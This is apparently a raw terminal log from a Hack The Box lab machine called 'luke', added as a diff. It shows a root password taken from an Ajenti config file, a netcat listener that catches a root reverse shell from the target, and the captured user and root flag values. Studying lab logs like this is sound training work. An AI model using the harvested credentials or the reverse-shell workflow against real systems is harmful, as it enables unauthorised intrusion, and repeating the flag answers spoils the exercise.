@@ -1,0 +1,112 @@
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #cat config.json | jq              
+{                                       
+  "users": {                            
+    "root": {                           
+      "configs": {                      
+        "ajenti.plugins.notepad.notepad.Notepad": "{\"bookmarks\": [], \"root\": \"/\"}",                                                                         
+        "ajenti.plugins.terminal.main.Terminals": "{\"shell\": \"sh -c $SHELL || sh\"}",                                                                          
+        "ajenti.plugins.elements.ipmap.ElementsIPMapper": "{\"users\": {}}",     
+        "ajenti.plugins.munin.client.MuninClient": "{\"username\": \"username\", \"prefix\": \"http://localhost:8080/munin\", \"password\": \"123\"}",            
+        "ajenti.plugins.dashboard.dash.Dash": "{\"widgets\": [{\"index\": 0, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.sensors.memory.MemoryWidget\"}, {\"index\": 1, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.sensors.memory.SwapWidget\"}, {\"index\": 2, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.dashboard.welcome.WelcomeWidget\"}, {\"index\": 0, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.sensors.uptime.UptimeWidget\"}, {\"index\": 1, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.power.power.PowerWidget\"}, {\"index\": 2, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.sensors.cpu.CPUWidget\"}]}",                                                                
+        "ajenti.plugins.elements.shaper.main.Shaper": "{\"rules\": []}",         
+        "ajenti.plugins.ajenti_org.main.AjentiOrgReporter": "{\"key\": null}",   
+        "ajenti.plugins.logs.main.Logs": "{\"root\": \"/var/log\"}",             
+        "ajenti.plugins.mysql.api.MySQLDB": "{\"password\": \"\", \"user\": \"root\", \"hostname\": \"localhost\"}",                                              
+        "ajenti.plugins.fm.fm.FileManager": "{\"root\": \"/\"}",                 
+        "ajenti.plugins.tasks.manager.TaskManager": "{\"task_definitions\": []}",
+        "ajenti.users.UserManager": "{\"sync-provider\": \"\"}",                 
+        "ajenti.usersync.adsync.ActiveDirectorySyncProvider": "{\"domain\": \"DOMAIN\", \"password\": \"\", \"user\": \"Administrator\", \"base\": \"cn=Users,dc=DOMAIN\", \"address\": \"localhost\"}",  
+        "ajenti.plugins.elements.usermgr.ElementsUserManager": "{\"groups\": []}",                                                                                
+        "ajenti.plugins.elements.projects.main.ElementsProjectManager": "{\"projects\": \"KGxwMQou\\n\"}"                                                         
+      },                                
+      "password": "KpMasng6S5EtTy9Z",   
+      "permissions": []                 
+    }                                   
+  },                                    
+  "language": "",                       
+  "bind": {                             
+    "host": "0.0.0.0",                  
+    "port": 8000                        
+  },                                    
+  "enable_feedback": true,              
+  "ssl": {                              
+    "enable": false,                    
+    "certificate_path": ""              
+  },                                    
+  "authentication": true,               
+  "installation_id": 12354              
+}                                       
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #vi credential                     
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #vi credential                     
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #ifconfig                          
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                       
+        inet 10.0.2.8  netmask 255.255.255.0  broadcast 10.0.2.255               
+        inet6 fe80::ed96:d3ba:685a:109f  prefixlen 64  scopeid 0x20<link>        
+        ether 08:00:27:29:cf:e4  txqueuelen 1000  (Ethernet)                     
+        RX packets 654273  bytes 333937013 (318.4 MiB)                           
+        RX errors 0  dropped 0  overruns 0  frame 0                              
+        TX packets 662719  bytes 126913554 (121.0 MiB)                           
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0               
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                                     
+        inet 127.0.0.1  netmask 255.0.0.0                                        
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>                             
+        loop  txqueuelen 1000  (Local Loopback)                                  
+        RX packets 67184  bytes 15614710 (14.8 MiB)                              
+        RX errors 0  dropped 0  overruns 0  frame 0                              
+        TX packets 67184  bytes 15614710 (14.8 MiB)                              
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0               
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500               
+        inet 10.10.14.14  netmask 255.255.254.0  destination 10.10.14.14         
+        inet6 fe80::9254:edfc:bd3b:6ec7  prefixlen 64  scopeid 0x20<link>        
+        inet6 dead:beef:2::100c  prefixlen 64  scopeid 0x0<global>               
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)                                                                          
+        RX packets 475018  bytes 198638537 (189.4 MiB)                           
+        RX errors 0  dropped 0  overruns 0  frame 0                              
+        TX packets 494349  bytes 70317342 (67.0 MiB)                             
+        TX errors 0  dropped 587 overruns 0  carrier 0  collisions 0             
+
+┌─[root@parrot]─[~/hackthebox/luke]     
+└──╼ #nc -nvlp 9001                     
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                     
+Ncat: Listening on :::9001              
+Ncat: Listening on 0.0.0.0:9001         
+Ncat: Connection from 10.10.10.137.     
+Ncat: Connection from 10.10.10.137:57691.                                        
+# ls                                    
+.cshrc                                  
+.login                                  
+.login_conf                             
+.mail_aliases                           
+.mailrc                                 
+.profile                                
+.shrc                                   
+user.txt                                
+# cat user.txt                          
+58d441e500e8941f9cf3baa499e2e4da        
+# whoam                                 
+/bin/sh: whoam: not found               
+# whoami                                
+root                                    
+# cd /root                              
+# ls                                    
+.cache                                  
+.config                                 
+.cshrc                                  
+.history                                
+.k5login                                
+.login                                  
+.mysql_history                          
+.node_repl_history                      
+.npm                                    
+.profile                                
+.wget-hsts                              
+root.txt                                
+# cat root.txt                          
+8448343028fadde1e2a1b0a44d01e650        
+#                                       
